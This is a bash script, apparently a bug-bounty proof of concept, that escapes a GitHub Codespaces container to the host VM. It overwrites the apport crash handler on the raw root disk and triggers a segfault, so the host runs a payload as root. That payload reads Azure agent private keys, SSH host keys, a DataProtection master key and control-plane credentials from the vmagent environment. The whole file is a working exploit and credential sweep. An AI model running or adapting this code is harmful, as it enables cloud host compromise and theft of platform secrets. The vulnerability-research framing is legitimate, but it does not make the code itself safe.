#!/bin/bash
# F-003 HOST SECRET SWEEP reproduction: VM escape -> inventory of host-only secret material.
# Run inside any codespace whose repo contains this script:  bash repro-f003-sweep.sh
# Authorized GitHub bug-bounty PoC (bounty.github.com scope). Run ONLY on a codespace you own.
# READ-ONLY against the host except: overwrites the first block of /usr/share/apport/apport
# (the escape mechanism, same as repro-f003.sh) and writes one marker file /HOST-SWEEP-REPRO.
# Everything printed below is material the platform stores root-only on the VM - none of it
# is reachable from the container without the escape. Cleanup = delete the codespace.
set -u
echo "[*] F-003 host-secret sweep start: $(date -u +%FT%TZ)"

# 1) locate the VM root disk (device ordering varies per boot)
D=""
for spec in 8:1 8:17 8:33 8:2 8:34; do
  maj=${spec%%:*}; min=${spec##*:}
  sudo rm -f /dev/rt; sudo mknod /dev/rt b "$maj" "$min" 2>/dev/null
  if sudo blkid /dev/rt 2>/dev/null | grep -q cloudimg-rootfs; then D=/dev/rt; break; fi
done
[ -z "$D" ] && { echo "[!] NO-ROOT-DISK. /sys/class/block:"; ls /sys/class/block; exit 1; }
echo "[+] FOUND-ROOT-DISK=$D"
echo "[+] container: pidns=$(readlink /proc/self/ns/pid) cgroup=$(cat /proc/self/cgroup) pid1=$(cat /proc/1/comm)"

# 2) payload executed by the HOST kernel as root: secret-store inventory
cat > /tmp/swpay <<'PEOF'
#!/bin/sh
B=/HOST-SWEEP-REPRO
{
echo "WHEN $(date -u +%FT%TZ)"
echo "uid=$(id -u) ppid=$PPID comm=$(cat /proc/$PPID/comm 2>/dev/null)"
echo '== [1] AZURE FABRIC TRANSPORT IDENTITY =='
ls -la /var/lib/waagent/TransportCert.pem /var/lib/waagent/TransportPrivate.pem 2>/dev/null
echo '-- TransportPrivate.pem first lines:'
head -2 /var/lib/waagent/TransportPrivate.pem 2>/dev/null
echo '== [2] PROVISIONING CERT + PRIVATE KEY =='
ls -la /var/lib/waagent/*.prv /var/lib/waagent/*.p7m 2>/dev/null
for f in /var/lib/waagent/*.prv; do echo "-- $f:"; head -2 "$f" 2>/dev/null; done
grep -oE '<Format>[^<]+' /var/lib/waagent/Certificates.xml 2>/dev/null | sed 's/^/-- Certificates.xml /'
echo '== [3] HOST SSH HOST KEYS =='
ls -la /etc/ssh/ssh_host_*_key 2>/dev/null
echo "-- ssh_host_rsa_key first line:"; head -1 /etc/ssh/ssh_host_rsa_key 2>/dev/null
echo '== [4] VMAGENT DATAPROTECTION MASTER KEY =='
for k in /root/.aspnet/DataProtection-Keys/key-*.xml; do
  echo "-- $k"
  grep -oE '<value>[^<]+' "$k" 2>/dev/null
  grep -oE 'expirationDate>[^<]+' "$k" 2>/dev/null
done
echo '== [5] CONTROL-PLANE CREDENTIALS (vmagent environ) =='
P=$(pgrep -f 'codespaces vmagent' | head -1)
echo "-- vmagent pid $P"
tr '\0' '\n' < /proc/$P/environ 2>/dev/null | grep -aE '^VSOAGENT_'
echo '== [6] FABRIC TOPOLOGY =='
grep -oE '<ns1:HostName>[^<]+' /var/lib/waagent/ovf-env.xml 2>/dev/null | sed 's/^/-- ovf-env /'
grep -oE 'address="[0-9.]+"' /var/lib/waagent/SharedConfig.xml 2>/dev/null | sed 's/^/-- SharedConfig /'
ls -d /home/generated-by-azure/src/walinuxagent 2>/dev/null | sed 's/^/-- /'
} > $B 2>&1
exit 0
PEOF
SZ=$(wc -c < /tmp/swpay); echo "[+] payload: $SZ bytes"
[ "$SZ" -gt 3900 ] && { echo "[!] payload too large"; exit 1; }

# 3) escape: in-place first-block overwrite, cache eviction, trigger
B1=$(sudo debugfs -R "blocks /usr/share/apport/apport" $D 2>/dev/null | grep -oE "[0-9]+" | head -1)
sudo dd if=/tmp/swpay of=$D bs=4096 seek=$B1 conv=notrunc count=1 2>/dev/null
sudo sh -c 'echo 3 > /proc/sys/vm/drop_caches' && echo "[+] CACHES-DROPPED"
sudo debugfs -w -R "rm /HOST-SWEEP-REPRO" $D >/dev/null 2>&1
sudo sh -c 'ulimit -c unlimited; kill -SEGV $$' 2>/dev/null
echo "[+] trigger sent; waiting for journal commit..."
M=""
for i in 1 2 3 4 5 6 7 8; do sleep 10; M=$(sudo debugfs -R "cat /HOST-SWEEP-REPRO" $D 2>/dev/null); [ -n "$M" ] && break; done
echo "===== HOST-WRITTEN SWEEP (/HOST-SWEEP-REPRO on the VM root filesystem) ====="
[ -z "$M" ] && { echo "[!] marker not found"; exit 1; }
echo "$M"
echo "===== ALL SIX SECRET CLASSES INVENTORIED FROM HOST ROOT ====="
echo "Next: bash repro-f003-blast.sh performs the same escape and prints the external"
echo "auth-oracle curl lines for the queue SAS captured above."
